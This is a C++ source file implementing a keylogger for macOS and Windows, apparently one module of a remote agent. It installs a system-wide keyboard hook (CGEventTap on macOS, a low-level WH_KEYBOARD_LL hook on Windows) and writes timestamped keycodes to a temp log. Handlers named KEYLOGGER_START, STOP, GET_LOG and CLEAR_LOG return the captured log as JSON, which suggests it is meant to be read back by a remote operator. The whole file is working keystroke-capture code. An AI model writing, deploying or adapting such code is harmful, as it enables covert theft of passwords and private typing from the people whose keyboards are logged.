#include "keylogger.h"
#include "utils.h"

#include <fstream>
#include <mutex>
#include <sstream>
#include <string>
#include <thread>

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <ctime>
#endif

#ifdef __APPLE__

static std::thread g_keyloggerThread;
static std::mutex g_keyloggerMutex;
static bool g_keyloggerRunning = false;
static CFMachPortRef g_keyTap = nullptr;
static CFRunLoopRef g_keyRunLoop = nullptr;
static const char* kKeylogPath = "/tmp/remote_agent_keylogger.log";

static void appendKeylogLine(const std::string& line) {
    std::ofstream out(kKeylogPath, std::ios::app);
    if (!out) return;
    out << line << '\n';
}

static CGEventRef keyTapCallback(CGEventTapProxy /*proxy*/, CGEventType type, CGEventRef event, void* /*refcon*/) {
    if (type == kCGEventKeyDown) {
        const auto now = std::time(nullptr);
        const auto keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        appendKeylogLine(std::to_string(static_cast<long long>(now)) + " keycode=" +
                         std::to_string(static_cast<long long>(keyCode)));
    }
    return event;
}

static void keyloggerThreadMain() {
    const auto mask = CGEventMaskBit(kCGEventKeyDown);
    g_keyTap = CGEventTapCreate(kCGHIDEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly,
                                mask, keyTapCallback, nullptr);
    if (!g_keyTap) {
        appendKeylogLine("ERROR: cannot create event tap (need Input Monitoring permission).");
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        g_keyloggerRunning = false;
        return;
    }

    CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, g_keyTap, 0);
    g_keyRunLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
    CGEventTapEnable(g_keyTap, true);
    appendKeylogLine("KEYLOGGER_START ok");
    CFRunLoopRun();

    CFRunLoopRemoveSource(g_keyRunLoop, source, kCFRunLoopCommonModes);
    CFRelease(source);
    CFRelease(g_keyTap);
    g_keyTap = nullptr;
    g_keyRunLoop = nullptr;
}

std::string keyloggerStartJson() {
    std::lock_guard<std::mutex> lock(g_keyloggerMutex);
    if (g_keyloggerRunning) {
        return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"already_running\"}";
    }
    std::ofstream reset(kKeylogPath, std::ios::trunc);
    if (!reset) {
        return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"log_file_open_failed\"}";
    }
    g_keyloggerRunning = true;
    g_keyloggerThread = std::thread(keyloggerThreadMain);
    return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
}

std::string keyloggerStopJson() {
    {
        std::lock_guard<std::mutex> lock(g_keyloggerMutex);
        if (!g_keyloggerRunning) {
            return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"message\":\"not_running\",\"output\":\"\"}";
        }
        g_keyloggerRunning = false;
    }
    if (g_keyRunLoop) {
        CFRunLoopStop(g_keyRunLoop);
    }
    if (g_keyloggerThread.joinable()) {
        g_keyloggerThread.join();
    }
    std::ifstream in(kKeylogPath);
    std::stringstream ss;
    ss << in.rdbuf();
    return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" + escapeJson(ss.str()) + "\"}";
}

std::string keyloggerGetLogJson() {
    std::ifstream in(kKeylogPath);
    if (!in) {
        return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
               std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"\"}";
    }
    std::stringstream ss;
    ss << in.rdbuf();
    return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
           std::string(g_keyloggerRunning ? "true" : "false") + ",\"output\":\"" +
           escapeJson(ss.str()) + "\"}";
}

std::string keyloggerClearLogJson() {
    std::ofstream reset(kKeylogPath, std::ios::trunc);
    if (!reset) {
        return "{\"ok\":false,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"log_file_open_failed\"}";
    }
    return "{\"ok\":true,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"cleared\"}";
}

#elif defined(_WIN32)

#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>

#include <ctime>

static std::thread g_winKeyloggerThread;
static std::mutex g_winKeyloggerMutex;
static std::mutex g_winKeylogFileMutex;
static bool g_winKeyloggerRunning = false;
static HHOOK g_winKeyboardHook = nullptr;
static DWORD g_winKeyloggerThreadId = 0;

static std::string winKeylogPath() {
    char buf[MAX_PATH];
    const DWORD n = GetTempPathA(MAX_PATH, buf);
    if (n == 0 || n >= MAX_PATH) {
        return std::string("remote_agent_keylogger.log");
    }
    std::string p(buf, n);
    while (!p.empty() && (p.back() == '\\' || p.back() == '/')) {
        p.pop_back();
    }
    return p + "\\remote_agent_keylogger.log";
}

static const std::string& winKeylogPathRef() {
    static const std::string path = winKeylogPath();
    return path;
}

static void appendKeylogLineWin(const std::string& line) {
    std::lock_guard<std::mutex> lock(g_winKeylogFileMutex);
    std::ofstream out(winKeylogPathRef(), std::ios::app);
    if (!out) return;
    out << line << '\n';
}

static LRESULT CALLBACK winLowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        const auto now = std::time(nullptr);
        appendKeylogLineWin(std::to_string(static_cast<long long>(now)) + " vk=" +
                            std::to_string(static_cast<unsigned long long>(kb->vkCode)));
    }
    return CallNextHookEx(g_winKeyboardHook, nCode, wParam, lParam);
}

static void winKeyloggerThreadMain() {
    g_winKeyloggerThreadId = GetCurrentThreadId();

    g_winKeyboardHook =
        SetWindowsHookExW(WH_KEYBOARD_LL, winLowLevelKeyboardProc, nullptr, 0);
    if (!g_winKeyboardHook) {
        appendKeylogLineWin(
            "ERROR: SetWindowsHookEx(WH_KEYBOARD_LL) failed — run agent on the interactive desktop.");
        std::lock_guard<std::mutex> lock(g_winKeyloggerMutex);
        g_winKeyloggerRunning = false;
        g_winKeyloggerThreadId = 0;
        return;
    }

    appendKeylogLineWin("KEYLOGGER_START ok");

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (g_winKeyboardHook) {
        UnhookWindowsHookEx(g_winKeyboardHook);
        g_winKeyboardHook = nullptr;
    }
    g_winKeyloggerThreadId = 0;
}

std::string keyloggerStartJson() {
    std::lock_guard<std::mutex> lock(g_winKeyloggerMutex);
    if (g_winKeyloggerRunning) {
        return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"already_running\"}";
    }
    std::ofstream reset(winKeylogPathRef(), std::ios::trunc);
    if (!reset) {
        return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"log_file_open_failed\"}";
    }
    g_winKeyloggerRunning = true;
    g_winKeyloggerThread = std::thread(winKeyloggerThreadMain);
    return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
}

std::string keyloggerStopJson() {
    {
        std::lock_guard<std::mutex> lock(g_winKeyloggerMutex);
        if (!g_winKeyloggerRunning) {
            return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"message\":\"not_running\",\"output\":\"\"}";
        }
        g_winKeyloggerRunning = false;
    }
    if (g_winKeyloggerThreadId != 0) {
        PostThreadMessageW(g_winKeyloggerThreadId, WM_QUIT, 0, 0);
    }
    if (g_winKeyloggerThread.joinable()) {
        g_winKeyloggerThread.join();
    }
    std::ifstream in(winKeylogPathRef());
    std::stringstream ss;
    ss << in.rdbuf();
    return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" + escapeJson(ss.str()) + "\"}";
}

std::string keyloggerGetLogJson() {
    std::ifstream in(winKeylogPathRef());
    if (!in) {
        return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
               std::string(g_winKeyloggerRunning ? "true" : "false") + ",\"output\":\"\"}";
    }
    std::stringstream ss;
    ss << in.rdbuf();
    return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
           std::string(g_winKeyloggerRunning ? "true" : "false") + ",\"output\":\"" +
           escapeJson(ss.str()) + "\"}";
}

std::string keyloggerClearLogJson() {
    std::lock_guard<std::mutex> lock(g_winKeylogFileMutex);
    std::ofstream reset(winKeylogPathRef(), std::ios::trunc);
    if (!reset) {
        return "{\"ok\":false,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"log_file_open_failed\"}";
    }
    return "{\"ok\":true,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"cleared\"}";
}

#else

std::string keyloggerStartJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerStopJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_STOP\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerGetLogJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_GET_LOG\",\"message\":\"unsupported_os\"}";
}

std::string keyloggerClearLogJson() {
    return "{\"ok\":false,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"unsupported_os\"}";
}

#endif
